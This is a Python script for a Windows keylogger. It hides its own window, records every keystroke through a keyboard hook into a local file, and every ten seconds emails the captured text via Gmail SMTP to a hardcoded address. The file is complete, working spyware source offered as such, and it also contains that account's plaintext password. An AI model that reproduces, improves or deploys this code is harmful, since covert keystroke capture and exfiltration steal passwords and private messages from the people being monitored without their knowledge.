import win32gui
import win32con
import pyHook
import pythoncom
import logging as logger
import smtplib
import time

# hides the keylogger while it is running-does not open a console window
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)

GMAIL_SERVER = 'smtp.gmail.com:587'
PROJECT_MAIL_ADDRESS = 'danacohentalbaum@gmail.com'
PROJECT_MAIL_PASS = 'danatal123'
SUBJECT_OF_MAIL_MSG = 'Subject: Keylogging data has been recorded!\n'
LOGGER_FILENAME = 'input.txt'
LOGGER_FORMAT = '%(message)s'
LOGGER_LEVEL = logger.INFO
LOGGER_LEVEL_NUMBER = 20
TIME_BETWEEN_EACH_EMAIL_MSG = 10


def OnKeyboardEvent(typed_char):
    """
    This method listen for keyboard presses, it gets the char that was typed and write it into a logger file.
    After a while it reads te file and send an email with the content.
    :param typed_char:
    :return: True - the keyboard event was caught.
    """
    global sending_time
    logger.basicConfig(filename=LOGGER_FILENAME, level=LOGGER_LEVEL, format=LOGGER_FORMAT)
    logger.log(LOGGER_LEVEL_NUMBER, chr(typed_char.Ascii))

    # if the a mail was sent more than 10 seconds ago, send mail
    if passed_enough_time_since_last_email(sending_time):
        file = open(LOGGER_FILENAME, 'r+')
        parsed_content = (parse_input_file(file))
        send_mail(parsed_content)
        sending_time = time.time()
        delete_old_file_content(file)
    return True


def passed_enough_time_since_last_email(last_email_sent_time):
    """
    Checks weather enough time passed since last email was sent.
    :param last_email_sent_time:
    :return: True/False
    """
    return time.time() - last_email_sent_time > TIME_BETWEEN_EACH_EMAIL_MSG


def parse_input_file(file):
    """
    Gets a file with series of chars. after each char there is a \n char.
    this method tur the seris of chars into words and sentence - make it more visible.
    :param file:
    :return: parsed file , with sentences and words instead of chars at each line.
    """
    content = file.read()
    parsed_content = content.replace('\n', '')
    return parsed_content


def delete_old_file_content(file):
    """
    This method delete the content in the logging file. this content was sent via email already so its no logger nedeed.
    :param file:
    :return: empty file.
    """
    file.seek(0)
    file.truncate()


def send_mail(message):
    """
    This method get a message , and sent it using SMTP API.
    :param message:
    """
    server = smtplib.SMTP(GMAIL_SERVER)
    server.starttls()
    server.login(PROJECT_MAIL_ADDRESS, PROJECT_MAIL_PASS)
    server.sendmail(PROJECT_MAIL_ADDRESS, PROJECT_MAIL_ADDRESS,
                    SUBJECT_OF_MAIL_MSG + message)
    server.quit()



sending_time = time.time()
# start logging keys
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


